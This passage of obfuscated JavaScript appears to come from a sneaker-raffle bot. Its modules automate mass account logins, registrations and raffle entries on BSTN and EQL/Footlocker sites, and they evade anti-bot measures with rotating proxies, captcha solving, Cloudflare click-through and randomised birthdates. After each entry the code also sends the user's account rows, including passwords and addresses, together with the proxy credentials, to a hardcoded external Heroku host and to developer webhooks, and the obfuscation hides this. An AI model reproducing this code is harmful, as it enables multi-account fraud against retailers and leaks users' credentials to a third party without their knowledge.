                                }), await _0x41ed31(0x1388), await _0x1ff180['waitForSelector']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x1ff180['focus']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x41ed31(0x1f4), console['log'](_0x82e5a5() + '\x20[' + _0x49b9d0['name'] + ']\x20Task\x20' + (_0x541a12 + 0x1) + '\x20:\x20Logging\x20in'), await _0x1ff180['$eval']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb', _0x35b8a9 => _0x35b8a9['click']()), await _0x1ff180['click']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x1ff180['click']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x41ed31(0x7d0), await _0x1ff180['waitForSelector']('#email-login'), await _0x1ff180['type']('#email-login', '' + _0xebbfb3[_0x541a12]['Email']['toLowerCase'](), { 'delay': 0xe6 }), await _0x41ed31(0xdac), await _0x1ff180['waitForSelector']('#password'), await _0x1ff180['type']('#password', '' + _0xebbfb3[_0x541a12]['Password'], { 'delay': 0xe6 }), await _0x41ed31(0x157c);
                                try {
                                    await _0x1ff180['$eval']('.login_accountInfo__FCIxY\x20>\x20button[type=\x22submit\x22]', _0x177b7a => _0x177b7a['click']());
                                } catch {
                                }
                                try {
                                    await _0x1ff180['waitForSelector']('.swatchOptions_sizeTiles__Lizc2');
                                } catch (_0x204034) {
                                }
                                await _0x41ed31(0x3e8);
                                const _0x40eb67 = await _0x1ff180['$']('.enteredDraw_container__2KmQ_');
                                if (_0x40eb67) {
                                    console['log']('Duplicate\x20entry,\x20skipping');
                                    return;
                                }
                                console['log'](_0x82e5a5() + '\x20[' + _0x49b9d0['name'] + ']\x20Task\x20' + (_0x541a12 + 0x1) + '\x20:\x20Choosing\x20Size\x20' + _0xebbfb3[_0x541a12]['Size']);
                                try {
                                    if (_0xebbfb3[_0x541a12]['Size'] != 'RANDOM') {
                                        var _0x284bb0 = _0xebbfb3[_0x541a12]['Size']['replace']('.', ',');
                                        const _0xcdbfdc = await _0x1ff180['$x']('//div[contains(text(),\x20\x27' + _0x284bb0 + '\x27)]');
                                        await _0xcdbfdc[0x0]['click']();
                                    } else {
                                        const _0x3e0123 = await _0x1ff180['$$']('div.swatchTile_tile__IRH9Q');
                                        var _0x1019a3 = Math['round'](Math['random']() * (_0x3e0123['length'] - 0x1));
                                        await _0x3e0123[_0x1019a3]['click']();
                                    }
                                } catch (_0x33530b) {
                                    throw new Error('Softblocked,\x20Rotating\x20proxy');
                                }
                                await _0x41ed31(0x1f4);
                                const _0x3c2cab = await _0x1ff180['$']('.addressList_addressItem__LE2PB');
                                if (_0x3c2cab && _0xebbfb3[_0x541a12]['Mode'] != 'NEW') {
                                } else
                                    console['log'](_0x82e5a5() + '\x20[' + _0x49b9d0['name'] + ']\x20Task\x20' + (_0x541a12 + 0x1) + '\x20:\x20Filling\x20Address'), await _0x1ff180['click']('div.product_shipping__zEfqd\x20>\x20div\x20>\x20div.legend_legend__sQIiF\x20>\x20div.legend_header__iHZIh\x20>\x20div\x20>\x20button'), await _0x41ed31(0x5dc), await _0x1ff180['waitForSelector']('#firstname'), await _0x1ff180['type']('#firstname', '' + _0xebbfb3[_0x541a12]['FirstName']), await _0x41ed31(0x1f4), await _0x1ff180['waitForSelector']('#firstname'), await _0x1ff180['type']('#lastname', '' + _0xebbfb3[_0x541a12]['LastName']), await _0x41ed31(0x1f4), await _0x1ff180['waitForSelector']('#firstname'), await _0x1ff180['type']('#street', '' + _0xebbfb3[_0x541a12]['Address1']), await _0x41ed31(0x1f4), await _0x1ff180['waitForSelector']('#firstname'), await _0x1ff180['type']('#houseNumber', _0xebbfb3[_0x541a12]['HouseNumber'] + '\x20' + _0xebbfb3[_0x541a12]['Address2']), await _0x41ed31(0x1f4), await _0x1ff180['waitForSelector']('#firstname'), await _0x1ff180['select']('#country_code', '' + _0xebbfb3[_0x541a12]['Country']), await _0x41ed31(0x1f4), await _0x1ff180['type']('#postcode', '' + _0xebbfb3[_0x541a12]['Zip']), await _0x41ed31(0x1f4), await _0x1ff180['type']('#city', '' + _0xebbfb3[_0x541a12]['City']), await _0x41ed31(0x1f4), await _0x1ff180['type']('#telephone', '' + _0xebbfb3[_0x541a12]['Phone']), await _0x41ed31(0x1f4), await _0x1ff180['click']('.addressModal_submit__dOiL4\x20>\x20button[type=\x22submit\x22]');
                                await _0x41ed31(0x9c4);
                                try {
                                    await _0x1ff180['type']('#instagram_name', '' + _0xebbfb3[_0x541a12]['Follower']), await _0x1ff180['click']('.note_groupBtn__WLDwH\x20>\x20button');
                                } catch {
                                }
                                console['log'](_0x82e5a5() + '\x20[' + _0x49b9d0['name'] + ']\x20Task\x20' + (_0x541a12 + 0x1) + '\x20:\x20Finishing\x20Entry'), await _0x41ed31(0x5dc);
                                try {
                                    await _0x1ff180['click']('.checkBox_boxHolder__wLGVe');
                                } catch {
                                }
                                await _0x41ed31(0x5dc), await _0x1ff180['$eval']('.termConditions_TC__hll9k\x20>\x20button', _0x4fb534 => _0x4fb534['click']()), await _0x41ed31(0x1388);
                                try {
                                    await _0x1ff180['waitForSelector']('.success_msg__2HjJY');
                                } catch {
                                    await _0x1ff180['reload']({ 'waitUntil': 'networkidle2' });
                                    if (_0xebbfb3[_0x541a12]['Size'] != 'RANDOM') {
                                        var _0x284bb0 = _0xebbfb3[_0x541a12]['Size']['replace']('.', ',');
                                        const _0x561419 = await _0x1ff180['$x']('//div[contains(text(),\x20' + _0x284bb0 + ')]');
                                        await _0x561419[0x0]['click']();
                                    } else {
                                        const _0x1e0bc2 = await _0x1ff180['$$']('div.swatchTile_tile__IRH9Q');
                                        var _0x1019a3 = Math['round'](Math['random']() * (_0x1e0bc2['length'] - 0x1));
                                        await _0x1e0bc2[_0x1019a3]['click']();
                                    }
                                    await _0x41ed31(0x5dc);
                                    try {
                                        await _0x1ff180['hover']('#instagram_name'), await _0x1ff180['type']('#instagram_name', '' + _0xebbfb3[_0x541a12]['Follower']), await _0x1ff180['click']('.note_groupBtn__WLDwH\x20>\x20button');
                                    } catch {
                                    }
                                    console['log'](_0x82e5a5() + '\x20[' + _0x49b9d0['name'] + ']\x20Task\x20' + (_0x541a12 + 0x1) + '\x20:\x20Retrying\x20(' + _0x2963f1 + '\x20/\x205)');
                                    try {
                                        await _0x1ff180['hover']('.checkBox_boxHolder__wLGVe'), await _0x41ed31(0x5dc), await _0x1ff180['click']('.checkBox_boxHolder__wLGVe');
                                    } catch {
                                    }
                                    await _0x41ed31(0x157c), await _0x1ff180['$eval']('.termConditions_TC__hll9k\x20>\x20button', _0x3fbbfa => _0x3fbbfa['click']()), await _0x41ed31(0x1388), await _0x1ff180['waitForSelector']('.success_msg__2HjJY');
                                }
                                _0x4ad3b2 = 'no', _0x13e83d(_0xebbfb3[_0x541a12], _0x49b9d0);
                                try {
                                    prxdata = {
                                        'username': _0x128b96['replace']('#', ''),
                                        'entrydata': JSON['stringify'](_0x411268),
                                        'proxy': '' + _0x12a81b[_0x541a12]
                                    };
                                    var _0x1dcead = JSON['stringify'](prxdata);
                                    let _0x28b5ce = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x48af5a['post']('https://jraffles.herokuapp.com/success', _0x1dcead, _0x28b5ce);
                                } catch (_0x49fe93) {
                                }
                                console['log'](_0x3dfcf2['green'](_0x82e5a5() + '\x20[' + _0x49b9d0['name'] + ']\x20Task\x20' + (_0x541a12 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                var _0xa8b45d = await _0x559dec(_0xebbfb3[_0x541a12], _0x49b9d0, 'dev', ![]), _0x41ea95 = await _0x559dec(_0xebbfb3[_0x541a12], _0x49b9d0, 'pub', ![]);
                                const _0x25bacd = {
                                    'succesDEVMSG': { 'embeds': [_0xa8b45d] },
                                    'succesPUBMSG': { 'embeds': [_0x41ea95] }
                                };
                                let _0x411268 = _0xebbfb3[_0x541a12];
                                try {
                                    prxdata = {
                                        'username': _0x128b96['replace']('#', ''),
                                        'module': _0x49b9d0['name'],
                                        'entrydata': JSON['stringify'](_0x411268),
                                        'proxy': '' + _0x12a81b[_0x541a12]
                                    };
                                    var _0x1dcead = JSON['stringify'](prxdata);
                                    let _0x4d9bba = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x48af5a['post']('https://jraffles.herokuapp.com/success', _0x1dcead, _0x4d9bba);
                                } catch (_0x11d037) {
                                }
                                try {
                                    _0x4ae33b['webhook'] != undefined && _0x4ae33b['webhook'] != '' && await _0x48936e(_0x4ae33b['webhook'], _0x25bacd['succesDEVMSG']), await _0x41ed31(0xc8), await _0x48936e(_0x3a625c, _0x25bacd['succesDEVMSG']), await _0x41ed31(0xc8), await _0x48936e(_0x22a07c, _0x25bacd['succesPUBMSG']);
                                } catch (_0x1555be) {
                                    console['log'](_0x3dfcf2['yellow'](_0x82e5a5() + '\x20[' + _0x49b9d0['name'] + ']\x20Task\x20' + (_0x541a12 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x1555be));
                                }
                            } catch (_0x3ca102) {
                                console['log'](_0x3dfcf2['red'](_0x82e5a5() + '\x20[' + _0x49b9d0['name'] + ']\x20Task\x20' + (_0x541a12 + 0x1) + '\x20:\x20' + _0x3ca102)), _0x4ad3b2 = 'yes', _0x538a99 = '' + _0x3ca102;
                                var _0x12bf43 = await _0x559dec(_0xebbfb3[_0x541a12], _0x49b9d0, 'dev', !![], _0x538a99), _0xa8b45d = await _0x559dec(_0xebbfb3[_0x541a12], _0x49b9d0, 'dev', ![]), _0x41ea95 = await _0x559dec(_0xebbfb3[_0x541a12], _0x49b9d0, 'pub', ![]);
                                const _0x20e399 = {
                                    'succesDEVMSG': { 'embeds': [_0xa8b45d] },
                                    'succesPUBMSG': { 'embeds': [_0x41ea95] }
                                };
                                _0x20e399['errorDEV'] = { 'embeds': [_0x12bf43] }, _0x4ae33b['webhook'] != undefined && _0x4ae33b['webhook'] != '' && await _0x48936e(_0x4ae33b['webhook'], _0x20e399['errorDEV']), await _0x48936e(_0x36657d, _0x20e399['errorDEV']);
                            } finally {
                                _0x11c753 && _0x11c753['close']();
                                if (_0x4ad3b2 == 'yes' && _0x2963f1 != 0x5)
                                    return console['log'](_0x3dfcf2['red'](_0x82e5a5() + '\x20[' + _0x49b9d0['name'] + ']\x20Task\x20' + (_0x541a12 + 0x1) + '\x20:\x20Retrying\x20(' + _0x2963f1 + '\x20/\x205)')), _0x2963f1 = _0x2963f1 + 0x1, _0x573250--, _0x3541f3(_0x49b9d0, _0xebbfb3, _0x12a81b, _0x541a12, _0x2963f1);
                                _0x4ad3b2 == 'yes' && _0x2963f1 >= 0x5 && _0x2504ad(_0xebbfb3[_0x541a12], _0x49b9d0), !_0x3032da && (console['log'](_0x82e5a5() + '\x20[' + _0x49b9d0['name'] + ']\x20Waiting\x20for\x20' + _0x4ae33b['delay'] + '\x20ms'), await _0x41ed31(_0x4ae33b['delay'])), _0x573250--;
                            }
                        }
                        _0x3541f3(_0x454106, _0x1e0d50, _0x5047bf, _0x1eb88b, 0x0), await _0x41ed31(0x7d0);
                    }
                }
            },
            {
                'name': 'BSTN\x20Win\x20Checker',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0x1af815, _0x14fa89) {
                    var _0x1313a0 = 0x0, _0x1ce749;
                    try {
                        const _0x406835 = _0x223df9['readFileSync']('../accounts/bstn.csv', 'utf-8');
                        _0x1ce749 = _0x57f277['parse'](_0x406835, { 'header': !![] })['data'];
                    } catch (_0x439cb6) {
                        throw new Error('Error\x20reading\x20accounts/bstn.csv');
                    }
                    for (var _0x4aaeb9 = 0x0; _0x4aaeb9 < _0x1ce749['length']; _0x4aaeb9++) {
                        maxTasks = Number(_0x4ae33b['threads']);
                        while (_0x1313a0 >= maxTasks) {
                            await _0x41ed31(_0x4ae33b['delay']);
                        }
                        async function _0x64adb0(_0x2e4c21, _0x44b73f, _0x12beaa, _0x482752, _0x1f52de) {
                            _0x1313a0++, _0x23e690['use'](_0x57a02e()), _0x23e690['use'](_0x2aeb7e({
                                'provider': {
                                    'id': '2captcha',
                                    'token': '' + _0x4ae33b['captchaKey']
                                },
                                'visualFeedback': !![]
                            }));
                            if (_0xec57f9 != 'yes')
                                var _0xec57f9 = '', _0x1f52de = 0x0;
                            var _0x2d636b;
                            _0x445891(_0x2e4c21['name'] + '\x20Task\x20' + (_0x482752 + 0x1) + '\x20/\x20' + _0x12beaa['length'] + '\x20||\x20File:\x20' + _0x4d7b48 + '\x20Proxies:\x20' + _0x2bc9a5);
                            var _0x11ddfc = await _0x559dec(_0x12beaa[_0x482752], _0x2e4c21, 'acc', ![]);
                            const _0x2f6768 = { 'succesDEVMSG': { 'embeds': [_0x11ddfc] } }, _0x39f41a = 'https://www.bstn.com/eu_en/customer/account/create/';
                            var _0x121017 = Math['round'](Math['random']() * (_0x44b73f['length'] - 0x1)), _0x1e8aab = _0x44b73f[_0x121017]['split'](':'), _0x48dfb7;
                            try {
                                _0x48dfb7 = await _0x23e690['launch']({
                                    'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                    'headless': !![],
                                    'args': [
                                        '--proxy-server=' + _0x1e8aab[0x0] + ':' + _0x1e8aab[0x1],
                                        '--no-sandbox',
                                        '--disable-setuid-sandbox'
                                    ]
                                });
                            } catch {
                                _0x48dfb7 = await _0x23e690['launch']({
                                    'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                    'headless': !![],
                                    'args': [
                                        '--proxy-server=' + _0x1e8aab[0x0] + ':' + _0x1e8aab[0x1],
                                        '--no-sandbox',
                                        '--disable-setuid-sandbox'
                                    ]
                                });
                            }
                            try {
                                console['log'](_0x82e5a5() + '\x20[' + _0x2e4c21['name'] + ']\x20Task\x20' + (_0x482752 + 0x1) + '\x20:\x20Checking\x20' + _0x12beaa[_0x482752]['Email']);
                                const _0x4594ac = await _0x48dfb7['newPage']();
                                await _0x4594ac['authenticate']({
                                    'username': '' + _0x1e8aab[0x2],
                                    'password': '' + _0x1e8aab[0x3]
                                }), console['log'](_0x82e5a5() + '\x20[' + _0x2e4c21['name'] + ']\x20Task\x20' + (_0x482752 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x4594ac['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x4594ac['setRequestInterception'](!![]), _0x4594ac['on']('request', _0x58b21e => {
                                    _0x58b21e['resourceType']() === 'image' ? _0x58b21e['abort']() : _0x58b21e['continue']();
                                });
                                try {
                                    await _0x4594ac['goto']('https://www.bstn.com/eu_en/raffle/customer/', { 'waitUntil': 'networkidle2' }), await _0x4594ac['waitForSelector']('button[class=\x22cf2Lf6\x22]');
                                } catch {
                                    _0xec57f9 = 'yes';
                                    throw new Error('Connection\x20Error');
                                }
                                await _0x4594ac['click']('button[class=\x22cf2Lf6\x22]'), console['log'](_0x82e5a5() + '\x20[' + _0x2e4c21['name'] + ']\x20Task\x20' + (_0x482752 + 0x1) + '\x20:\x20Passing\x20Cloudflare'), await _0x41ed31(0x3e8), await _0x4594ac['type']('#email', _0x12beaa[_0x482752]['Email']), await _0x41ed31(0x1f4), await _0x4594ac['type']('#pass', _0x12beaa[_0x482752]['Password']), await _0x41ed31(0x1f4), await _0x4594ac['$eval']('#login-form', _0x200dc7 => _0x200dc7['submit']());
                                try {
                                    await _0x4594ac['waitForSelector']('.product-items');
                                } catch {
                                    console['log'](_0x82e5a5() + '\x20[' + _0x2e4c21['name'] + ']\x20Task\x20' + (_0x482752 + 0x1) + '\x20:\x20No\x20Entries\x20Found');
                                    return;
                                }
                                await _0x41ed31(0x190);
                                const _0x20ce0c = await _0x4594ac['evaluate'](() => {
                                    const _0x3ed976 = Array['from'](document['querySelectorAll']('.product-item-photo\x20>\x20img'));
                                    return _0x3ed976['map'](_0x13fb09 => _0x13fb09['alt']);
                                }), _0x379536 = await _0x4594ac['evaluate'](() => {
                                    const _0x106322 = Array['from'](document['querySelectorAll']('.tooltip.wrapper.product-item-tooltip.first-xs'));
                                    return _0x106322['map'](_0x492897 => _0x492897['innerHTML']);
                                }), _0x510631 = await _0x4594ac['$$']('.raffle-winner');
                                if (_0x510631['length'] < 0x1) {
                                    console['log'](_0x82e5a5() + '\x20[' + _0x2e4c21['name'] + ']\x20Task\x20' + (_0x482752 + 0x1) + '\x20:\x20No\x20Wins\x20Found'), _0xec57f9 = 'no';
                                    return;
                                }
                                console['log'](_0x82e5a5() + '\x20[' + _0x2e4c21['name'] + ']\x20Task\x20' + (_0x482752 + 0x1) + '\x20:\x20' + _0x510631['length'] + '\x20Wins\x20Found!');
                                for (var _0x3ed178 = 0x0; _0x3ed178 < _0x510631['length']; _0x3ed178++) {
                                    console['log'](_0x3dfcf2['green'](_0x20ce0c[_0x3ed178] + _0x379536[_0x3ed178]['replace']('\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20', '')));
                                }
                            } catch (_0x2fa076) {
                                console['log'](_0x3dfcf2['red'](_0x82e5a5() + '\x20[' + _0x2e4c21['name'] + ']\x20Task\x20' + (_0x482752 + 0x1) + '\x20:\x20' + _0x2fa076)), _0x2d636b = '' + _0x2fa076;
                                var _0x8075a9 = await _0x559dec(_0x12beaa[_0x482752], _0x2e4c21, 'acc', !![], _0x2d636b);
                                _0x2f6768['errorDEV'] = { 'embeds': [_0x8075a9] }, _0x4ae33b['webhook'] != undefined && _0x4ae33b['webhook'] != '' && await _0x48936e(_0x4ae33b['webhook'], _0x2f6768['errorDEV']), await _0x48936e(_0x36657d, _0x2f6768['errorDEV']), _0xec57f9 = 'yes';
                            } finally {
                                if (_0x48dfb7)
                                    _0x48dfb7['close']();
                                if (_0xec57f9 == 'yes' && _0x1f52de != 0x5)
                                    return console['log'](_0x3dfcf2['red'](_0x82e5a5() + '\x20[' + _0x2e4c21['name'] + ']\x20Task\x20' + (_0x482752 + 0x1) + '\x20:\x20Retrying\x20(' + _0x1f52de + '\x20/\x205)')), _0x1313a0--, _0x1f52de = _0x1f52de + 0x1, _0x64adb0(_0x2e4c21, _0x44b73f, _0x12beaa, _0x482752, _0x1f52de);
                                _0xec57f9 == 'yes' && _0x1f52de >= 0x5 && (_0x2504ad(_0x12beaa[_0x482752], _0x2e4c21), _0xec57f9 = 'no', _0x1f52de = 0x0), console['log'](_0x82e5a5() + '\x20[' + _0x2e4c21['name'] + ']\x20Waiting\x20for\x20' + _0x4ae33b['delay'] + '\x20ms'), await _0x41ed31(_0x4ae33b['delay']), _0x1313a0--;
                            }
                        }
                        _0x64adb0(_0x1af815, _0x14fa89, _0x1ce749, _0x4aaeb9, 0x0), await _0x41ed31(0x15e);
                    }
                }
            }
        ]
    },
    {
        'name': 'EQL',
        'modules': [{
            'name': 'EQL\x20Raffle\x20Entries',
            'store': 'EQL',
            'logo': 'https://res.cloudinary.com/crunchbase-production/image/upload/c_lpad,h_170,w_170,f_auto,b_white,q_auto:eco,dpr_1/qfc09zbor8py2zfmsdr2',
            'function': async function (_0xe15fbb, _0x23a9d7, _0x1acb52) {
                _0x23e690['use'](_0x57a02e()), _0x23e690['use'](_0x2aeb7e({
                    'provider': {
                        'id': '2captcha',
                        'token': '' + _0x4ae33b['captchaKey']
                    },
                    'visualFeedback': !![]
                }));
                for (var _0x56cb1c = 0x0; _0x56cb1c < _0x23a9d7['length']; _0x56cb1c++) {
                    var _0x433bab;
                    _0x445891(_0xe15fbb['name'] + '\x20Task\x20' + (_0x56cb1c + 0x1) + '\x20/\x20' + _0x23a9d7['length'] + '\x20||\x20File:\x20' + _0x4d7b48 + '\x20Proxies:\x20' + _0x2bc9a5);
                    try {
                        await _0x101e1b(_0x23a9d7, _0x56cb1c);
                    } catch {
                        _0xd8834 = 'no';
                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                    }
                    async function _0x54a95a(_0x100b4f) {
                        const _0x2f3b37 = _0x223df9['readFileSync']('../successful-tasks.csv', 'utf8'), _0x147314 = _0x57f277['parse'](_0x2f3b37, { 'header': !![] })['data'];
                        let _0xb2d6d0 = ![];
                        for (var _0x44facb of _0x147314) {
                            if (_0x44facb['Url'] == _0x100b4f['Url'] && _0x44facb['Email'] == _0x100b4f['Email']) {
                                _0xb2d6d0 = !![];
                                break;
                            }
                        }
                        return _0xb2d6d0;
                    }
                    if (await _0x54a95a(_0x23a9d7[_0x56cb1c]) == !![]) {
                        console['log'](_0x82e5a5() + '\x20[' + _0xe15fbb['name'] + ']\x20Task\x20' + (_0x56cb1c + 0x1) + '\x20:\x20Task\x20Already\x20Entered,\x20Going\x20to\x20Next\x20Task');
                        continue;
                    }
                    var _0x1ac46f = ![];
                    const _0x1fa4f5 = _0x223df9['readFileSync']('../accounts/eql.csv', 'utf8');
                    var _0xcf6650 = _0x57f277['parse'](_0x1fa4f5, { 'header': !![] })['data'];
                    for (var _0x19ef9c of _0xcf6650) {
                        _0x19ef9c['Email'] == _0x23a9d7[_0x56cb1c]['Email'] && (_0x1ac46f = !![]);
                    }
                    if (_0x1ac46f == ![]) {
                        var _0x10eae3;
                        if (_0x23a9d7[_0x56cb1c]['Url']['endsWith']('/')) {
                            _0x10eae3 = _0x23a9d7[_0x56cb1c]['Url'] + 'register';
                            if (_0xd8834 != 'yes')
                                var _0xd8834 = '', _0x4af555 = 0x0;
                        } else {
                            _0x10eae3 = _0x23a9d7[_0x56cb1c]['Url'] + '/register';
                            if (_0xd8834 != 'yes')
                                var _0xd8834 = '', _0x4af555 = 0x0;
                        }
                        if (_0x23a9d7[_0x56cb1c]['Email'] == '' || _0x23a9d7[_0x56cb1c]['FirstName'] == '' || _0x23a9d7[_0x56cb1c]['LastName'] == '') {
                            console['log'](_0x82e5a5() + '\x20[' + _0xe15fbb['name'] + ']\x20Task\x20' + (_0x56cb1c + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        _0x23a9d7[_0x56cb1c]['Password'] == '' && (_0x23a9d7[_0x56cb1c]['Password'] = 'JRaffles23!');
                        if (_0x4ae33b['useRandomProxy'] = ![])
                            var _0x363339 = _0x1acb52[_0x56cb1c]['split'](':');
                        else
                            var _0x24cdd2 = Math['round'](Math['random']() * (_0x1acb52['length'] - 0x1)), _0x363339 = _0x1acb52[_0x24cdd2]['split'](':');
                        var _0x26d586;
                        try {
                            _0x26d586 = await _0x23e690['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x363339[0x0] + ':' + _0x363339[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x26d586 = await _0x23e690['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x363339[0x0] + ':' + _0x363339[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x4d9653 = await _0x26d586['newPage']();
                            await _0x4d9653['authenticate']({
                                'username': '' + _0x363339[0x2],
                                'password': '' + _0x363339[0x3]
                            }), console['log'](_0x82e5a5() + '\x20[' + _0xe15fbb['name'] + ']\x20Task\x20' + (_0x56cb1c + 0x1) + '\x20:\x20Getting\x20Session'), await _0x4d9653['setRequestInterception'](!![]), _0x4d9653['on']('request', _0x21a139 => {
                                _0x21a139['resourceType']() === 'image' || _0x21a139['resourceType']() === 'font' || _0x21a139['resourceType']() === 'media' ? _0x21a139['abort']() : _0x21a139['continue']();
                            });
                            try {
                                await _0x4d9653['goto']('' + _0x10eae3);
                            } catch {
                                throw new Error('Connection\x20Error');
                            }
                            console['log'](_0x82e5a5() + '\x20[' + _0xe15fbb['name'] + ']\x20Task\x20' + (_0x56cb1c + 0x1) + '\x20:\x20Setting\x20Credentials'), await _0x41ed31(0x3e8), await _0x4d9653['waitForSelector']('#email');
                            try {
                                try {
                                    await _0x4d9653['click']('div[data-testid=\x22field-productVariantID\x22]'), await _0x41ed31(0x3e8), _0x23a9d7[_0x56cb1c]['Url']['includes']('en-GB') ? await _0x4d9653['click']('li[data-value=\x22UK\x20' + _0x23a9d7[_0x56cb1c]['Size'] + '\x20/\x20US\x20' + (Number(_0x23a9d7[_0x56cb1c]['Size']) + 0x1) + '\x22]') : await _0x4d9653['click']('li[data-value=\x22EU\x20' + _0x23a9d7[_0x56cb1c]['Size'] + '\x22]');
                                } catch {
                                    await _0x4d9653['click']('#productQuantity'), await _0x41ed31(0x3e8), await _0x4d9653['click']('li[data-value=\x22' + (Number(_0x23a9d7[_0x56cb1c]['Size']) - 0x1) + '\x22]');
                                }
                            } catch {
                                throw new Error('Error\x20fetching\x20' + _0x23a9d7[_0x56cb1c]['Size']);
                            }
                            await _0x41ed31(0x6a4);
                            try {
                                await _0x4d9653['select']('.PhoneInputCountrySelect', _0x23a9d7[_0x56cb1c]['Country']);
                            } catch {
                            }
                            await _0x4d9653['type']('#email', '' + _0x23a9d7[_0x56cb1c]['Email']), await _0x41ed31(0x352), await _0x4d9653['waitForSelector']('#password'), await _0x4d9653['type']('#password', '' + _0x23a9d7[_0x56cb1c]['Password']), await _0x41ed31(0x352), await _0x4d9653['type']('#phone', '' + _0x23a9d7[_0x56cb1c]['Phone']), await _0x41ed31(0x352);
                            const _0x2f3c5f = await _0x4d9653['$']('#title\x20>\x20label');
                            await _0x41ed31(0x12c);
                            _0x2f3c5f && await _0x2f3c5f['click']();
                            await _0x4d9653['type']('#firstName', '' + _0x23a9d7[_0x56cb1c]['FirstName']), await _0x41ed31(0x352), await _0x4d9653['type']('#lastName', '' + _0x23a9d7[_0x56cb1c]['LastName']), await _0x41ed31(0x352);
                            _0x23a9d7[_0x56cb1c]['Url']['includes']('footlocker.de') ? await _0x4d9653['type']('#birthdate', _0x120d6e(0xa, 0x1c) + '.' + _0x120d6e(0xa, 0xc) + '.' + _0x120d6e(0x7c6, 0x7d3)) : await _0x4d9653['type']('#birthdate', _0x120d6e(0xa, 0x1c) + '-' + _0x120d6e(0xa, 0xc) + '-' + _0x120d6e(0x7c6, 0x7d3));
                            await _0x41ed31(0x352), await _0x4d9653['click']('.MuiBox-root.css-79elbk\x20>\x20button');
                            try {
                                !_0x23a9d7[_0x56cb1c]['Url']['includes']('en-GB') && await _0x4d9653['waitForSelector']('#stateAutocomplete');
                            } catch {
                                throw new Error('Connection\x20Error\x20fetching\x20shipping');
                            }
                            await _0x41ed31(0x1f4), await _0x41ed31(0x5dc);
                            if (!_0x10eae3['includes']('footlocker'))
                                try {
                                    await _0x4d9653['click']('#country');
                                    const _0x50786f = await _0x4d9653['$']('li[data-value=\x22' + _0x23a9d7[_0x56cb1c]['Country'] + '\x22]');
                                    await _0x50786f['click'](), await _0x50786f['click']();
                                } catch {
                                    throw new Error('Country.\x20Please\x20use\x20exact\x20data\x20in\x20csv.\x20(Case\x20sensitive)');
                                }
                            await _0x41ed31(0x3e8);
                            if (!_0x23a9d7[_0x56cb1c]['Url']['includes']('en-GB')) {
                                await _0x4d9653['click']('#stateAutocomplete'), await _0x41ed31(0x5dc);
                                try {
                                    const _0x4e0de3 = await _0x4d9653['$x']('//li[text()=\x22' + _0x23a9d7[_0x56cb1c]['State'] + '\x22]');
                                    await _0x4e0de3[0x0]['click']();
                                } catch {
                                    throw new Error('State\x20/\x20Province\x20not\x20found.\x20Please\x20use\x20exact\x20data\x20in\x20csv.\x20(Case\x20sensitive)');
                                }
                            }
                            console['log'](_0x82e5a5() + '\x20[' + _0xe15fbb['name'] + ']\x20Task\x20' + (_0x56cb1c + 0x1) + '\x20:\x20Setting\x20Address'), await _0x41ed31(0x3e8), await _0x41ed31(0x1f4);
                            if (_0x23a9d7[_0x56cb1c]['Url']['includes']('topps')) {
                                await _0x4d9653['click']('#stateAutocomplete'), await _0x41ed31(0x5dc);
                                try {
                                    const _0x5c3a7c = await _0x4d9653['$x']('//li[text()=\x22' + _0x23a9d7[_0x56cb1c]['State'] + '\x22]');
                                    await _0x5c3a7c[0x0]['click']();
                                } catch {
                                    throw new Error('State\x20/\x20Province\x20not\x20found.\x20Please\x20use\x20exact\x20data\x20in\x20csv.\x20(Case\x20sensitive)');
                                }
                            }
